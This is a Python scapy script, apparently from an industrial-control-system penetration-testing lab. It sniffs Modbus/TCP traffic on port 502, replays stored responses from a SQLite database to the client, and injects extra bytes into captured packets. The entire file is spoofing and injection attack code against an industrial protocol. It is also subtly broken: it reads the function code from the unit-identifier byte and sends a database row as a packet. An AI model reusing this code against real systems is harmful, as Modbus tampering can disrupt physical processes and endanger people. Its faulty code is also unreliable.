import sqlite3
from scapy.all import *

# Connect with sqlite database
conn = sqlite3.connect('/home/kali/ICSPentesting/ICSPentesting/Attack/modbus_data.db')
c = conn.cursor()

# Get Modbus response from database
def get_modbus_packet(transaction_id, client_id, function_code, packet_type):
    c.execute("SELECT * FROM modbus_data WHERE packet_type=? AND Transaction_Identifier=? AND Unit_Identifier=? AND Function_Code=?", (packet_type, transaction_id, client_id, function_code))
    packet = c.fetchone()
    if packet:
        return packet
    else:
        return None

# Function to inject data into Modbus packages 
def inject_data(pkt):
    pkt[TCP].load += b'\x00\x01\x02\x03' 
    
    return pkt

# Sniffing and injection
def sniff_and_inject(iface):
    def process_packet(pkt):
        if TCP in pkt and pkt[TCP].dport == 502: 
            # Check if the TCP packet has load
            if Raw in pkt:
                modbus_data = pkt[TCP].load
                if modbus_data[8:].hex() == "0001001103000000":
                    print ("Ultimo paquete capturado")

                    # Extract transaction_id and client_id from Modbus packet
                    transaction_id = modbus_data[:2].hex()
                    print("Transation_Identifier: ", transaction_id)
                    client_id = modbus_data[6:7].hex()
                    print("Client_Identifier: ", client_id)
                    function_code = modbus_data[6:7].hex()
                    print("Function Code: ", function_code)
                    
                    # Query database to get Modbus response 
                    response = get_modbus_packet(transaction_id, client_id, function_code, "Response")
                    if response:
                        # Print Modbus response
                        print("Modbus response:", response)

                        # Send response to client
                        sendp(response, iface=iface)
                    
                        # Inject data into the packet
                        pkt = inject_data(pkt)
                        
                        # Send modified packet to the server
                        #sendp(pkt, iface=iface)

    sniff(iface=iface, prn=process_packet)

sniff_and_inject('lo')



